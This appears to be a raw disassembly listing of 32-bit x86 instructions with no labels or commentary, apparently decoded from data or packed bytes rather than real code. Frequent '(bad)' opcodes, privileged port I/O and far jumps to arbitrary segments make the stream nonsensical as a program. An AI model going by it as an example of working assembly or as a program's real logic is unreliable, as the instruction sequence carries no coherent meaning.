  40cbf1:	lea    esp,[edx+0x2d44d5c2]
  40cbf7:	sub    DWORD PTR [ebx],eax
  40cbf9:	and    DWORD PTR [eax+0x707ce8a4],ecx
  40cbff:	add    ebx,DWORD PTR [esi]
  40cc01:	xchg   ebx,eax
  40cc02:	push   esi
  40cc03:	test   BYTE PTR [esi+0x27],0xe8
  40cc07:	mov    edi,0x5bf8e35
  40cc0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cc0d:	and    BYTE PTR [ecx+0x12f5b8eb],al
  40cc13:	inc    esi
  40cc14:	fisttp DWORD PTR [edi+eax*4]
  40cc17:	xchg   esp,eax
  40cc18:	jmp    0x9516fffe
  40cc1d:	das    
  40cc1e:	shl    DWORD PTR [ecx-0x40],0x3d
  40cc22:	jmp    0x41ae:0xa6c165aa
  40cc29:	outs   dx,BYTE PTR ds:[si]
  40cc2b:	rol    dl,1
  40cc2d:	push   edi
  40cc2e:	out    dx,al
  40cc2f:	adc    ebx,ebx
  40cc31:	(bad)  
  40cc32:	xchg   edi,eax
  40cc33:	mov    esp,0x62027678
  40cc38:	loopne 0x40cc05
  40cc3a:	or     ebx,edx
  40cc3c:	mov    DWORD PTR ds:0x1c7e41d,edi
  40cc42:	cmp    BYTE PTR [ebx+0x74],cl
  40cc45:	mov    bl,BYTE PTR [esi]
  40cc47:	dec    edi
  40cc48:	push   ecx
  40cc49:	leave  
  40cc4a:	loopne 0x40ccb9
  40cc4c:	sbb    DWORD PTR [ecx],esi
  40cc4e:	loope  0x40cca3
  40cc50:	cmp    dl,BYTE PTR [eax-0x4275a4f6]
  40cc56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc57:	add    dl,BYTE PTR [esi-0x52570032]
  40cc5d:	adc    eax,0x5cbd2731
  40cc62:	sbb    BYTE PTR [edx-0x27],dl
  40cc65:	pop    esi
  40cc66:	fdivr  DWORD PTR [esi-0x39685b13]
  40cc6c:	or     esi,DWORD PTR [ebx]
  40cc6e:	test   esi,ecx
  40cc70:	and    dl,BYTE PTR [eax-0x5a]
  40cc73:	mov    ch,dl
  40cc75:	mov    dl,0x7b
  40cc77:	pop    ds
  40cc78:	out    0x7d,al
  40cc7a:	pusha  
  40cc7b:	popf   
  40cc7c:	mov    al,0xbe
  40cc7e:	ins    BYTE PTR es:[edi],dx
  40cc7f:	dec    eax
  40cc80:	mov    DWORD PTR cs:[eax+0x77],ecx
  40cc84:	xchg   DWORD PTR [esi],eax
  40cc86:	jmp    FWORD PTR [edi]
  40cc88:	mov    edx,0xb282f1b0
  40cc8d:	push   esp
  40cc8e:	push   es
  40cc8f:	xchg   BYTE PTR [ebx-0x6],ah
  40cc92:	xor    BYTE PTR [edx+ebp*2],dh
  40cc95:	in     eax,dx
  40cc96:	iret   
  40cc97:	mov    esi,0x34f9518e
  40cc9c:	dec    ebp
  40cc9d:	cmp    dh,ah
  40cc9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cca0:	js     0x40cd04
  40cca2:	cmp    edi,DWORD PTR [edx+0x1e]
  40cca5:	popa   
  40cca6:	or     al,0xf5
  40cca8:	cmp    al,BYTE PTR [ebx+0x46f8b6c6]
  40ccae:	cld    
  40ccaf:	mov    cl,0x6a
  40ccb1:	jbe    0x40cca1
  40ccb3:	sub    eax,0x7556c412
  40ccb8:	dec    BYTE PTR [edi]
  40ccba:	(bad)  
  40ccbb:	or     eax,0x300b07c7
  40ccc0:	inc    esp
  40ccc1:	es clc 
  40ccc3:	xchg   ebp,eax
  40ccc4:	dec    esi
  40ccc5:	dec    esi
  40ccc6:	sti    
  40ccc7:	inc    esi
  40ccc8:	xchg   ebp,eax
  40ccc9:	sub    eax,edi
  40cccb:	inc    edi
  40cccc:	sbb    ebx,DWORD PTR ds:0x53df2196
  40ccd2:	retf   0x47f
  40ccd5:	test   DWORD PTR [eax+0x43],edi
  40ccd8:	out    dx,al
  40ccd9:	sub    eax,0x8f4fde11
  40ccde:	or     BYTE PTR [ecx-0x29],bl
  40cce1:	stos   BYTE PTR es:[edi],al
  40cce2:	pop    DWORD PTR [edx-0x2]
  40cce5:	cli    
  40cce6:	es arpl si,sp
  40cce9:	push   esi
  40ccea:	jae    0x40cd2a
  40ccec:	test   al,0x80
  40ccee:	fs and al,0x4a
  40ccf1:	push   ds
  40ccf2:	bnd jl 0x40ccdb
  40ccf5:	xchg   edx,eax
  40ccf6:	dec    ecx
  40ccf7:	or     eax,esp
  40ccf9:	ins    DWORD PTR es:[edi],dx
  40ccfa:	jg     0x40cca2
  40ccfc:	inc    ebx
  40ccfd:	and    al,0xd5
  40ccff:	mov    edi,0x9789d28d
  40cd04:	popa   
  40cd05:	cmp    ah,BYTE PTR [ecx+eax*4+0x4a]
  40cd09:	fs stc 
  40cd0b:	adc    DWORD PTR [eax-0x63],0xffffffa5
  40cd0f:	nop
  40cd10:	pop    edi
  40cd11:	std    
  40cd12:	and    DWORD PTR [eax+0x6c],0xffffff80
  40cd16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd17:	mov    esi,0x401b0b2a
  40cd1c:	cmp    eax,0x8fe64194
  40cd21:	(bad)  
  40cd22:	fcom   QWORD PTR [edx+0x49af78f8]
  40cd28:	arpl   WORD PTR [esi+0x312790f8],sp
  40cd2e:	sub    bh,al
  40cd30:	lahf   
  40cd31:	jb     0x40cd7e
  40cd33:	or     eax,DWORD PTR [ecx+ebp*1+0x4c]
  40cd37:	stos   BYTE PTR es:[edi],al
  40cd38:	lds    edx,FWORD PTR [bx+si-0x32]
  40cd3c:	pop    esi
  40cd3d:	mov    ecx,0xf2b3ae98
  40cd42:	pop    ebp
  40cd43:	repnz dec edi
  40cd45:	ins    BYTE PTR es:[edi],dx
  40cd46:	pop    ss
  40cd47:	retf   
  40cd48:	loop   0x40cd4b
  40cd4a:	dec    ebx
  40cd4b:	add    DWORD PTR [edx+0x119b2bd5],ebp
  40cd51:	xchg   ecx,eax
  40cd52:	jge    0x40cdac
  40cd54:	add    al,0x67
  40cd56:	and    al,0x58
  40cd58:	arpl   WORD PTR [ebp+esi*8+0x283df6a2],ax
  40cd5f:	pop    edi
  40cd60:	in     al,dx
  40cd61:	iret   
  40cd62:	ja     0x40cd44
  40cd64:	ins    BYTE PTR es:[edi],dx
  40cd65:	xlat   BYTE PTR ds:[ebx]
  40cd66:	or     eax,0x1518f290
  40cd6b:	repnz xchg esp,eax
  40cd6d:	icebp  
  40cd6e:	push   ebp
  40cd6f:	daa    
  40cd70:	mov    dh,0xf
  40cd72:	in     al,dx
  40cd73:	cmp    BYTE PTR [edx],bh
  40cd75:	fwait
  40cd76:	mov    eax,ds:0x75f7ab1e
  40cd7b:	(bad)  
  40cd7c:	(bad)  
  40cd7d:	jecxz  0x40cd6b
  40cd7f:	loope  0x40cd7a
  40cd81:	std    
  40cd82:	and    al,0xa
  40cd84:	pop    esp
  40cd85:	xchg   BYTE PTR [edx+ebp*1+0x7c7bcb91],dh
  40cd8c:	repnz sbb DWORD PTR [esi-0x50],ebx
  40cd90:	shl    BYTE PTR [edx-0x2e511576],0x74
  40cd97:	jne    0x40cdbd
  40cd99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cd9a:	push   ds
  40cd9b:	mov    eax,ds:0xcb33720b
  40cda0:	xchg   edx,eax
  40cda1:	add    BYTE PTR ds:0xd5084b41,bh
  40cda7:	mov    esi,DWORD PTR [edi-0x7c]
  40cdaa:	pop    ss
  40cdab:	mov    ebp,0x857d377f
  40cdb0:	sbb    eax,0xdd6d4e51
  40cdb5:	inc    ebp
  40cdb6:	aam    0xce
  40cdb8:	aas    
  40cdb9:	and    DWORD PTR [ebp-0x2d433aec],edi
  40cdbf:	jb     0x40cded
  40cdc1:	jge    0x40cd84
  40cdc3:	sub    eax,ebx
  40cdc5:	pusha  
  40cdc6:	add    BYTE PTR es:[ecx+ebp*4+0x1a281dd0],dl
  40cdce:	or     eax,ebp
  40cdd0:	(bad)  
  40cdd1:	stos   DWORD PTR es:[edi],eax
  40cdd2:	inc    edi
  40cdd3:	rol    DWORD PTR [ebp+0x74],0x54
  40cdd7:	cmc    
  40cdd8:	jno    0x40cdac
  40cdda:	inc    eax
  40cddb:	popa   
  40cddc:	xchg   ebx,eax
  40cddd:	xchg   edx,eax
  40cdde:	adc    bh,dl
  40cde0:	mov    bl,bl
  40cde2:	ins    DWORD PTR es:[edi],dx
  40cde3:	out    0xac,eax
  40cde5:	and    BYTE PTR [ebp-0x3c6080ef],0xb7
  40cdec:	jg     0x40cd9d
  40cdee:	(bad)  
  40cdef:	pop    ds
  40cdf0:	add    edi,ebp
  40cdf2:	cs add ah,bh
  40cdf5:	fisubr WORD PTR [edx+0xf543625]
  40cdfb:	test   al,0xa6
  40cdfd:	jmp    0x40ce44
  40cdff:	je     0x40ce36
  40ce01:	adc    DWORD PTR [esi],edx
  40ce03:	mov    bl,0x3
  40ce05:	das    
  40ce06:	pop    edx
  40ce07:	jae    0x40cdb9
  40ce09:	xchg   ebp,eax
  40ce0a:	out    dx,eax
  40ce0b:	lea    esi,[eax]
  40ce0d:	lods   eax,DWORD PTR ds:[esi]
  40ce0e:	xchg   ebx,eax
  40ce0f:	pushf  
  40ce10:	rol    DWORD PTR [eax],1
  40ce12:	fbld   TBYTE PTR [edx+0x7e461fc4]
  40ce18:	jne    0x40ce4a
  40ce1a:	mov    BYTE PTR [ebp-0x15],cl
  40ce1d:	aas    
  40ce1e:	imul   edx,ebp,0x11de18e
  40ce24:	pop    ss
  40ce25:	call   0x7239051
  40ce2a:	sbb    BYTE PTR [edi-0x27cecc22],dl
  40ce30:	stc    
  40ce31:	imul   ecx,DWORD PTR [eax-0x65],0xffffffdc
  40ce35:	fld    TBYTE PTR [edx-0x70]
  40ce38:	mov    DWORD PTR [esi+edx*1-0x35bceb68],0x39505d9f
  40ce43:	(bad)  
  40ce44:	mov    eax,0x70f0b4a6
  40ce49:	fstp   QWORD PTR ds:0x65fb96dc
  40ce4f:	ins    DWORD PTR es:[edi],dx
  40ce50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce51:	mov    ah,0xd5
  40ce53:	inc    esp
  40ce54:	cdq    
  40ce55:	cmp    BYTE PTR [ecx],ch
  40ce57:	pop    ecx
  40ce58:	sub    DWORD PTR [eax-0x9],ebx
  40ce5b:	mov    bh,0xb6
  40ce5d:	scas   eax,DWORD PTR es:[edi]
  40ce5e:	(bad)  
  40ce5f:	je     0x40ce78
  40ce61:	pop    eax
  40ce62:	jbe    0x40ce30
  40ce64:	mov    DWORD PTR [ebx+0x7b26f878],0x3c8f80cd
  40ce6e:	and    dh,BYTE PTR gs:[ecx+0x7b]
  40ce72:	dec    esp
  40ce73:	(bad)  
  40ce74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce75:	jbe    0x40ced9
  40ce77:	ds inc esi
  40ce79:	rcr    DWORD PTR [eax-0x38],1
  40ce7c:	or     eax,0xc1c64478
  40ce81:	mov    al,ds:0x883d822f
  40ce86:	ins    DWORD PTR es:[edi],dx
  40ce87:	xor    bl,BYTE PTR [edx+edx*2-0x75]
  40ce8b:	adc    DWORD PTR [edx+edi*2-0x40d9bb3f],esi
  40ce92:	jge    0x40ce77
  40ce94:	in     al,dx
  40ce95:	nop
  40ce96:	stos   DWORD PTR es:[edi],eax
  40ce97:	addr16 mov esp,0x139f19e
  40ce9d:	jl     0x40cee9
  40ce9f:	jne    0x40cf20
  40cea1:	std    
  40cea2:	sbb    eax,0xc0f0369f
  40cea7:	push   edx
  40cea8:	ret    0xe48e
  40ceab:	(bad)  
  40ceac:	out    dx,eax
  40cead:	lods   al,BYTE PTR ds:[esi]
  40ceae:	frstor [esi]
  40ceb0:	rcl    BYTE PTR [esp+edi*2-0x73efc2d],1
  40ceb7:	test   al,0xa9
  40ceb9:	mov    ah,0xc9
  40cebb:	pushf  
  40cebc:	push   ds
  40cebd:	xlat   BYTE PTR ds:[ebx]
  40cebe:	xlat   BYTE PTR ds:[ebx]
  40cebf:	scas   al,BYTE PTR es:[edi]
  40cec0:	in     eax,0x71
  40cec2:	out    dx,eax
  40cec3:	adc    BYTE PTR [eax-0x562e4f0b],bl
  40cec9:	push   ebx
  40ceca:	inc    eax
  40cecb:	push   cs
  40cecc:	mov    bl,0x5c
  40cece:	ja     0x40cf08
  40ced0:	sbb    BYTE PTR [esi+0x7b1a0bcc],0xa1
  40ced7:	(bad)  
  40ced8:	daa    
  40ced9:	push   0xab080b6
  40cede:	aad    0x3a
  40cee0:	cli    
  40cee1:	sub    al,0x64
  40cee3:	xchg   BYTE PTR [ecx-0x1b6469b1],al
  40cee9:	cs mov ch,0x1b
  40ceec:	lods   al,BYTE PTR ds:[esi]
  40ceed:	(bad)  
  40ceee:	pop    edx
  40ceef:	out    0x82,eax
  40cef1:	mov    al,0x37
  40cef3:	ret    
  40cef4:	cdq    
  40cef5:	jo     0x40cf73
  40cef7:	shl    BYTE PTR [edi],cl
  40cef9:	ret    0x4780
  40cefc:	adc    al,0x37
  40cefe:	mov    dl,0xc4
  40cf00:	sbb    al,0xc8
  40cf02:	mov    ch,0xa5
  40cf04:	lods   al,BYTE PTR ds:[esi]
  40cf05:	xlat   BYTE PTR ds:[ebx]
  40cf06:	dec    esp
  40cf07:	std    
  40cf08:	das    
  40cf09:	xor    dh,BYTE PTR [edi-0x258c1446]
  40cf0f:	div    DWORD PTR [ebx+0x57]
  40cf12:	xor    eax,0x18bed280
  40cf17:	jmp    0x40cf69
  40cf19:	cwde   
  40cf1a:	sbb    BYTE PTR ds:0xbd8054f4,0xee
  40cf21:	mov    edi,0x3a314d0d
  40cf26:	jae    0x40cf8b
  40cf28:	sti    
  40cf29:	lahf   
  40cf2a:	cmp    bh,BYTE PTR [ecx+0x68]
  40cf2d:	sbb    ch,BYTE PTR [ebp-0x45]
  40cf30:	mov    eax,ds:0xc4066a2b
  40cf35:	lods   al,BYTE PTR ds:[esi]
  40cf36:	pop    esi
  40cf37:	aad    0x9d
  40cf39:	or     eax,0xc3fdfec5
  40cf3e:	dec    edx
  40cf3f:	mov    edx,0x6683adf0
  40cf44:	lods   al,BYTE PTR ds:[esi]
  40cf46:	jmp    0x9f381ec
  40cf4b:	test   DWORD PTR [ebx-0x79532006],ebp
  40cf51:	loopne 0x40cf4b
  40cf53:	cmc    
  40cf54:	out    0x25,eax
  40cf56:	popf   
  40cf57:	mov    esi,0x22a0e162
  40cf5c:	popf   
  40cf5d:	rcl    BYTE PTR [eax+0x25],0xa9
  40cf61:	mov    edx,0xfdf3bd82
  40cf66:	ret    0x462b
  40cf69:	js     0x40cf79
  40cf6b:	pop    ss
  40cf6c:	jbe    0x40cf6a
  40cf6e:	aam    0x76
  40cf70:	dec    esi
  40cf71:	sbb    eax,0xe986e04e
  40cf76:	add    ch,BYTE PTR [edx+0x53]
  40cf79:	outs   dx,DWORD PTR ds:[esi]
  40cf7a:	or     DWORD PTR [ebp-0x649d2c09],0xffffffda
  40cf81:	adc    al,0xd3
  40cf83:	push   0xffffffdc
  40cf85:	pop    es
  40cf86:	dec    ecx
  40cf87:	ins    DWORD PTR es:[edi],dx
  40cf88:	call   0x4a04032b
  40cf8d:	mov    bh,0x2d
  40cf8f:	xchg   edi,eax
  40cf90:	loop   0x40cfc6
  40cf92:	xor    ch,BYTE PTR [eax-0x796b3aed]
  40cf98:	lods   al,BYTE PTR ds:[esi]
  40cf99:	call   0xb36:0xf427fdd8
  40cfa0:	push   edx
  40cfa1:	imul   BYTE PTR [ebp+0x1a]
  40cfa4:	xchg   ebx,eax
  40cfa5:	in     al,0xec
  40cfa7:	push   ebp
  40cfa8:	stc    
  40cfa9:	int3   
  40cfaa:	xor    ch,dl
  40cfac:	and    al,0xa
  40cfae:	pop    esp
  40cfaf:	push   ecx
  40cfb0:	or     DWORD PTR [ebx-0x48296bd3],ebx
  40cfb6:	mov    DWORD PTR [edx+ebx*4+0x1d],eax
  40cfba:	cmc    
  40cfbb:	adc    DWORD PTR [edi-0x78871417],0x3b
  40cfc2:	cld    
  40cfc3:	popf   
  40cfc4:	mov    al,BYTE PTR [eax+0x1c]
  40cfc7:	imul   ecx,DWORD PTR [edx+eax*2-0x6304221a],0xffffffe3
  40cfcf:	lahf   
  40cfd0:	lahf   
  40cfd1:	loopne 0x40d036
  40cfd3:	or     BYTE PTR [eax],bl
  40cfd5:	ins    BYTE PTR es:[edi],dx
  40cfd6:	ja     0x40cf5d
  40cfd8:	jmp    0x40cff5
  40cfda:	xor    cl,BYTE PTR [edi+0x419e8cbe]
  40cfe0:	in     eax,dx
  40cfe1:	mov    edi,0x66f36ecb
  40cfe6:	sub    eax,0xd420adf2
  40cfeb:	cwde   
  40cfec:	sar    BYTE PTR [ebp+0x6f557112],0x95
  40cff3:	xor    eax,0xdc62bfd6
  40cff8:	out    dx,eax
  40cff9:	dec    esp
  40cffa:	push   esp
  40cffb:	push   es
  40cffc:	pusha  
  40cffd:	(bad)  
  40cffe:	(bad)  
  40cfff:	mov    esp,0x597a7a0a
  40d004:	dec    ecx
  40d005:	push   ebx
  40d006:	mov    BYTE PTR [ecx-0x1e],bh
  40d009:	stos   BYTE PTR es:[edi],al
  40d00a:	or     DWORD PTR [ebx-0x78],esp
  40d00d:	test   eax,0x6522aff3
  40d012:	cmp    eax,0x5ee734ff
  40d017:	cmp    edx,DWORD PTR [esi]
  40d019:	arpl   WORD PTR [eax],dx
  40d01b:	mov    dl,0xba
  40d01d:	add    eax,0xbc955462
  40d022:	xor    bh,0x6c
  40d025:	stos   DWORD PTR es:[edi],eax
  40d026:	bound  ebx,QWORD PTR [edx-0x42dd70c6]
  40d02c:	pop    esp
  40d02d:	call   DWORD PTR [ebp-0x749df31d]
  40d033:	(bad)  [ebp-0x65]
  40d036:	sub    ah,dl
  40d038:	sbb    ecx,edi
  40d03a:	call   0x7abc:0x49b70e99
  40d041:	sbb    DWORD PTR [ecx],0xc647e06e
  40d047:	lods   eax,DWORD PTR ds:[esi]
  40d048:	jne    0x40cfd6
  40d04a:	inc    edi
  40d04b:	jmp    0x40d070
  40d04d:	pop    ds
  40d04e:	and    ah,BYTE PTR [esi+0x3ec35630]
  40d054:	lods   eax,DWORD PTR ds:[esi]
  40d055:	push   ecx
  40d056:	test   DWORD PTR [esi+0x735f6bfd],0x26c9d176
  40d060:	or     eax,DWORD PTR [ebx]
  40d062:	retf   
  40d063:	out    0xa7,al
  40d065:	sbb    DWORD PTR [esi-0xdd73c76],edx
  40d06b:	inc    ecx
  40d06c:	jbe    0x40d066
  40d06e:	mov    ch,0x4c
  40d070:	data16 cmc 
  40d072:	into   
  40d073:	push   edx
  40d074:	cmp    ebx,DWORD PTR [ecx-0x3ea5eac0]
  40d07a:	cmp    ah,BYTE PTR [edi-0x7e]
  40d07d:	mov    cs,WORD PTR [eax+eax*1-0x6da8f5b]
  40d084:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d085:	es mov edi,0x9068c6cf
  40d08b:	scas   eax,DWORD PTR es:[edi]
  40d08c:	push   0xffffffd4
  40d08e:	mov    edi,ebx
  40d090:	jmp    0x206d1bfb
  40d095:	stc    
  40d096:	es pop esp
  40d098:	and    edx,DWORD PTR [ebx]
  40d09a:	cld    
  40d09b:	lea    ecx,[ebx-0xf]
  40d09e:	lahf   
  40d09f:	pop    ebp
  40d0a0:	into   
  40d0a1:	pop    ds
  40d0a2:	sbb    eax,0x1d350ceb
  40d0a7:	daa    
  40d0a8:	fldcw  WORD PTR [edx+0x60]
  40d0ab:	mov    al,0xf5
  40d0ad:	add    DWORD PTR [eax-0x7c],eax
  40d0b0:	mov    al,0x56
  40d0b2:	cmp    esp,DWORD PTR [ebp+0x53]
  40d0b5:	es xchg ebx,eax
  40d0b7:	dec    edx
  40d0b8:	pop    ebx
  40d0b9:	pop    ss
  40d0ba:	repnz pop ebp
  40d0bc:	mov    cl,0xae
  40d0be:	jo     0x40d060
  40d0c0:	xor    DWORD PTR [esi-0x44],eax
  40d0c3:	jg     0x40d0b2
  40d0c5:	int    0xf
  40d0c7:	sbb    esp,DWORD PTR [edi+0x2a42cf40]
  40d0cd:	pop    es
  40d0ce:	or     BYTE PTR [esi+0x566f31c4],dl
  40d0d4:	mov    eax,ds:0x91ef00b7
  40d0d9:	adc    bl,dl
  40d0db:	push   ebx
  40d0dc:	rol    BYTE PTR [edx-0x36],1
  40d0df:	(bad)  
  40d0e0:	aad    0x82
  40d0e2:	(bad)  [esi+0x75]
  40d0e5:	inc    edx
  40d0e6:	jmp    0x9a4a:0x6d7b057f
  40d0ed:	xchg   ah,al
  40d0ef:	push   ds
  40d0f0:	imul   DWORD PTR ds:0x153f8da6
  40d0f6:	out    dx,al
  40d0f7:	popa   
  40d0f8:	icebp  
  40d0f9:	adc    BYTE PTR [ecx+ebx*2+0x2096244f],ch
  40d100:	add    al,dl
  40d102:	and    dl,ch
  40d104:	pushf  
  40d105:	iret   
  40d106:	lds    edi,FWORD PTR [eax+0x4f481cb9]
  40d10c:	or     DWORD PTR [ecx],0x6f309da7
  40d112:	mov    ah,0x5e
  40d114:	xor    al,0xc9
  40d116:	mov    edx,0x6651c83c
  40d11b:	adc    al,0x6f
  40d11d:	stos   DWORD PTR es:[edi],eax
  40d11e:	fwait
  40d11f:	push   edi
  40d120:	add    DWORD PTR [eax-0x6b76fee],esp
  40d126:	mov    esi,0x78565365
  40d12b:	jg     0x40d12b
  40d12d:	cli    
  40d12e:	repz and ebp,ebx
  40d131:	ss cld 
  40d133:	es clc 
  40d135:	or     DWORD PTR [bx],edi
  40d138:	inc    edi
  40d139:	fwait
  40d13a:	sub    eax,0x4c5bc887
  40d13f:	adc    ebx,DWORD PTR [eax]
  40d141:	loop   0x40d128
  40d143:	jne    0x40d175
  40d145:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d146:	jbe    0x40d12e
  40d148:	or     DWORD PTR [esi],edi
  40d14a:	dec    edi
  40d14b:	cdq    
  40d14c:	xchg   edx,eax
  40d14d:	retf   
  40d14e:	fistp  DWORD PTR [eax+0x5]
  40d151:	sub    ecx,DWORD PTR [eax]
  40d153:	in     eax,dx
  40d154:	(bad)  
  40d155:	popa   
  40d156:	cmc    
  40d157:	fidivr WORD PTR [esi-0x53590c09]
  40d15d:	cmp    al,0x97
  40d15f:	cmp    bh,BYTE PTR [esi]
  40d161:	push   eax
  40d162:	lds    eax,FWORD PTR [eax-0x20]
  40d165:	sub    BYTE PTR [esi],bl
  40d167:	xchg   ecx,eax
  40d168:	outs   dx,BYTE PTR ds:[esi]
  40d169:	xor    BYTE PTR [edx+0x55],bl
  40d16c:	push   ebx
  40d16d:	mov    edx,0x2b779475
  40d172:	stos   BYTE PTR es:[edi],al
  40d173:	push   0xffffffc9
  40d175:	jmp    0x7b0e:0xee723c18
  40d17c:	sub    eax,DWORD PTR [eax+0x7c]
  40d17f:	push   esp
  40d180:	leave  
  40d181:	adc    ebp,0xffffff9a
  40d184:	daa    
  40d185:	not    BYTE PTR [eax]
  40d187:	cmp    DWORD PTR [eax+ebp*2-0x55d04f4d],esi
  40d18e:	xor    DWORD PTR [eax],edi
  40d190:	outs   dx,DWORD PTR ds:[esi]
  40d192:	ror    BYTE PTR [ebx+ecx*2],cl
  40d195:	add    al,0x33
  40d197:	call   0x50be:0x94040d19
  40d19e:	rcr    esp,1
  40d1a0:	and    al,BYTE PTR [edi]
  40d1a2:	iret   
  40d1a3:	xchg   DWORD PTR ds:0x530b6bad,edx
  40d1a9:	in     al,0x47
  40d1ab:	mov    ds:0xe8b4cde1,al
  40d1b0:	lahf   
  40d1b1:	je     0x40d196
  40d1b3:	xchg   edi,eax
  40d1b4:	mov    ecx,0xa02f4f31
  40d1b9:	mov    ebp,0x43756f3e
  40d1be:	inc    eax
  40d1bf:	adc    al,0x88
  40d1c1:	and    esi,eax
  40d1c3:	mov    DWORD PTR [edx],0xe45f98f0
  40d1c9:	and    ecx,DWORD PTR [edi+0x5f4fa9b0]
  40d1cf:	fdiv   QWORD PTR ss:[ebx+0x61136c26]
  40d1d6:	dec    esi
  40d1d7:	push   esi
  40d1d8:	mov    eax,0xcbefad55
  40d1dd:	(bad)
  40d1e0:	shl    DWORD PTR [eax+0x14],cl
  40d1e3:	shl    BYTE PTR [edx],1
  40d1e5:	xchg   ecx,ebx
  40d1e7:	call   0x539b:0x760b861b
  40d1ee:	test   ebp,esi
  40d1f0:	pop    ebx
  40d1f1:	repz les ecx,FWORD PTR [edi-0x34]
  40d1f5:	add    BYTE PTR [ebp-0x63a4384b],bh
  40d1fb:	cdq    
  40d1fc:	fucomip st,st(6)
  40d1fe:	dec    esi
  40d1ff:	jp     0x40d191
  40d201:	dec    DWORD PTR [edi]
  40d203:	sti    
  40d204:	iret   
  40d205:	jge    0x40d223
  40d207:	ja     0x40d25b
  40d209:	inc    eax
  40d20a:	pop    ecx
  40d20b:	jle    0x40d23d
  40d20d:	jge    0x40d229
  40d20f:	imul   BYTE PTR [edi-0x30]
  40d212:	shl    ch,1
  40d214:	cmp    ebp,ebx
  40d216:	popa   
  40d217:	jl     0x40d1a4
  40d219:	popf   
  40d21a:	lock data16 and al,0xe3
  40d21e:	outs   dx,BYTE PTR ds:[esi]
  40d21f:	pop    edx
  40d220:	std    
  40d221:	idiv   BYTE PTR [esi+0x1a]
  40d224:	adc    DWORD PTR [edx+0x3c],esp
  40d227:	jmp    0x829:0xc32bff33
  40d22e:	sti    
  40d22f:	mov    bl,0x86
  40d231:	xchg   esp,eax
  40d232:	xor    al,0x40
  40d234:	fs mov dl,bh
  40d237:	dec    ebx
  40d238:	adc    DWORD PTR [eax+0x2988b5e],esp
  40d23e:	xor    al,BYTE PTR [ebx-0x723a759e]
  40d244:	pop    esi
  40d245:	xchg   ebp,eax
  40d246:	xchg   edi,eax
  40d247:	push   ds
  40d248:	inc    ebp
  40d249:	add    ebp,0xffffffcc
  40d24c:	ins    DWORD PTR es:[edi],dx
  40d24d:	ror    DWORD PTR [eax-0x3d],0xd3
  40d251:	inc    esi
  40d252:	scas   eax,DWORD PTR es:[edi]
  40d253:	nop
  40d254:	das    
  40d255:	clc    
  40d256:	(bad)  
  40d257:	jmp    0x40d23b
  40d259:	pcmpeqw mm4,mm0
  40d25c:	fidivr WORD PTR [edi-0x61]
  40d25f:	add    ch,bh
  40d261:	data16 arpl WORD PTR [edi],si
  40d264:	cmc    
  40d265:	mov    dl,0x58
  40d267:	std    
  40d268:	lock leave 
  40d26a:	(bad)  
  40d26b:	aaa    
  40d26c:	test   al,0x91
  40d26e:	mov    ds:0x73b65725,eax
  40d273:	mov    ecx,0xf9a675b7
  40d278:	xchg   BYTE PTR [ebp+0x6d],ah
  40d27b:	pop    ds
  40d27c:	pop    ecx
  40d27d:	inc    esi
  40d27e:	sub    DWORD PTR [ebp-0x11578a3f],0xa342be29
  40d288:	sbb    DWORD PTR [ebp+esi*1+0x4b],0x7a
  40d28d:	mov    dl,0xc0
  40d28f:	cmp    al,0x6c
  40d291:	mov    ebx,0xa63fb85b
  40d296:	daa    
  40d297:	push   0x73
  40d299:	push   ds
  40d29a:	iret   
  40d29b:	xor    al,0x48
  40d29d:	jo     0x40d2b5
  40d29f:	xlat   BYTE PTR ds:[ebx]
  40d2a0:	sar    edi,0x50
  40d2a3:	mov    dl,0xb8
  40d2a5:	cmp    DWORD PTR [ebx+0x3e],ebp
  40d2a8:	mov    ecx,0x717bf852
  40d2ad:	fxch   st(6)
  40d2af:	mov    cl,0xb8
  40d2b1:	push   edi
  40d2b2:	fistp  DWORD PTR [edi+0x194f4443]
  40d2b8:	fadd   st(2),st
  40d2ba:	imul   edx,esi,0x5c
  40d2bd:	jae    0x40d314
  40d2bf:	sti    
  40d2c0:	icebp  
  40d2c1:	data16 cmp ah,ch
  40d2c4:	cmp    al,0xe
  40d2c6:	adc    al,0x14
  40d2c8:	(bad)  
  40d2c9:	jl     0x40d318
  40d2cb:	push   esi
  40d2cc:	test   BYTE PTR [eax+0x35dc6bff],dh
  40d2d2:	or     eax,0x26b01993
  40d2d7:	jecxz  0x40d283
  40d2d9:	ja     0x40d31e
  40d2db:	mov    al,ds:0x482e6dfe
  40d2e0:	rcl    BYTE PTR [edi-0x98924b1],0x66
  40d2e7:	or     al,0x89
  40d2e9:	ficomp DWORD PTR [edx+ebp*2+0x2c]
  40d2ed:	daa    
  40d2ee:	jne    0x40d285
  40d2f0:	mov    DWORD PTR [ecx],edi
  40d2f2:	aas    
  40d2f3:	mov    cl,0xc7
  40d2f5:	pusha  
  40d2f6:	dec    ebx
  40d2f7:	cli    
  40d2f8:	cwde   
  40d2f9:	fidiv  WORD PTR [ebx+0x3e1c88ff]
  40d2ff:	pushf  
  40d300:	fwait
  40d301:	and    BYTE PTR [edx+ecx*8+0x22b33b16],bh
  40d308:	xchg   BYTE PTR [ecx+0x42ca9645],al
  40d30e:	cld    
  40d30f:	jmp    0x40d297
  40d311:	test   DWORD PTR [ecx],0x45627702
  40d317:	test   eax,0xa2425a8d
  40d31c:	lock (bad) 
  40d31e:	data16 (bad) 
  40d320:	mov    ecx,0x20e5613a
  40d325:	loope  0x40d2f7
  40d327:	mov    ds:0xb13425b8,eax
  40d32c:	dec    ecx
  40d32e:	push   ds
  40d32f:	shr    dh,cl
  40d331:	inc    esi
  40d332:	ror    BYTE PTR [ecx-0x66f21deb],0xf3
  40d339:	pop    esp
  40d33a:	rcr    DWORD PTR [esi-0x17afeb6d],0x1d
  40d341:	sub    esi,esp
  40d343:	and    DWORD PTR [ecx*4-0x538132de],esp
  40d34a:	xor    al,0x60
  40d34c:	fcmovnb st,st(2)
  40d34e:	dec    esp
